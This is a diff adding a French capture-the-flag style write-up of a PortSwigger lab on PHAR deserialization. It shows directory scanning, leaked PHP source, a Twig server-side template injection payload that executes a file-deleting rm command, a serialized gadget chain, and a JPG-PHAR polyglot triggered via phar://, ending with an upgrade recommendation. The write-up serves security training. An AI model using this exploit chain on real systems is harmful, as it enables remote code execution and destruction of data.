@@ -136,3 +136,179 @@ TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAv
 - Dans la méthode __wakeup de la classe CustomTemplate, appeler la méthode build_product qui va reconstruire l'objet $product en utilisant la propriété $default_desc_type.
 
 ---
+
+```
+Lab: Using PHAR deserialization to deploy a custom gadget chain
+
+EXPERT
+
+This lab does not explicitly use deserialization. However, if you combine PHAR deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain.
+
+To solve the lab, delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter 
+```
+
+# Observations :
+https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain
+## SCAN :
+```
+┌──(kali㉿kali)-[~]
+└─$ dirb https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/     
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Apr  6 17:37:47 2023
+URL_BASE: https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/ ----
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/analytics (CODE:200|SIZE:0)                                                                                         
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/cgi-bin (CODE:200|SIZE:786)                                                                                         
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/cgi-bin/ (CODE:200|SIZE:786)                                                                                        
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/favicon.ico (CODE:200|SIZE:15406)                                                                                   
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/login (CODE:200|SIZE:3697)                                                                                          
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/Login (CODE:200|SIZE:3697)                                                                                          
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/logout (CODE:302|SIZE:0)                                                                                            
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/my-account (CODE:302|SIZE:0)                                                                                        
++ https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/post (CODE:400|SIZE:27)                                                                             
+-----------------
+END_TIME: Thu Apr  6 17:41:38 2023
+DOWNLOADED: 4612 - FOUND: 9
+```
+
+Résultat interessant : /cgi-bin
+
+> https://0a0c0064047ea91881ef393c007b00b7.web-security-academy.net/cgi-bin
+
+![alt text for screen readers](result.png "Text to show on mouseover")
+
+- CustomTemplate.php~ :
+```php
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lockFilePath());
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lockFilePath(), "") === false) {
+                throw new Exception("Could not write to " . $this->lockFilePath());
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        @unlink($this->lockFilePath());
+    }
+
+    private function lockFilePath()
+    {
+        return 'templates/' . $this->template_file_path . '.lock';
+    }
+}
+
+?>
+```
+- Blog.php~ :
+```php
+<?php
+
+require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');
+
+class Blog {
+    public $user;
+    public $desc;
+    private $twig;
+
+    public function __construct($user, $desc) {
+        $this->user = $user;
+        $this->desc = $desc;
+    }
+
+    public function __toString() {
+        return $this->twig->render('index', ['user' => $this->user]);
+    }
+
+    public function __wakeup() {
+        $loader = new Twig_Loader_Array([
+            'index' => $this->desc,
+        ]);
+        $this->twig = new Twig_Environment($loader);
+    }
+
+    public function __sleep() {
+        return ["user", "desc"];
+    }
+}
+
+?>
+```
+
+![alt text for screen readers](twig.png "Text to show on mouseover")
+
+> Version vulnérable : Twig <= 1.19.0
+
+On a donc l'utilisation d'une version vulnérable de Twig
+
+## Twig - Code execution
+payload : 
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
+````
+
+- Référence : Payload all the things 
+
+> Also you should check the Wrapper Phar:// in File Inclusion which use a PHP object injection.
+
+On remarque que l'on peut acceder à notre image téléversé depuis le chemin suivant : `/cgi-bin/avatar.php?avatar=wiener`
+Le serveur n'accepte que les images de type JPG. 
+
+https://github.com/kunte0/phar-jpg-polyglot
+
+Essayons de crée un JPG contenant une archive PHP (fichier Phar) contenant notre code sérailisé.
+
+On utilise l'outil phar jpg polyglot afin de generer l'image
+
+
+```
+┌──(kali㉿kali)-[/opt/phar-jpg-polyglot]
+└─$ sudo php -c php.ini phar_jpg_polyglot.php
+
+string(215) "O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"user";s:4:"xmco";s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}";}}"
+```
+
+Il ne reste plus qu'a upload l'image, et l'appeler avec `phar://` pour executer la déserialisation :
+> /cgi-bin/avatar.php?avatar=phar://wiener
+
+Well done ! :)
+
+---
+# Recommandation :
+
+- Mettre à jour le framework Twig vers une version > 1.19.0
+
+---
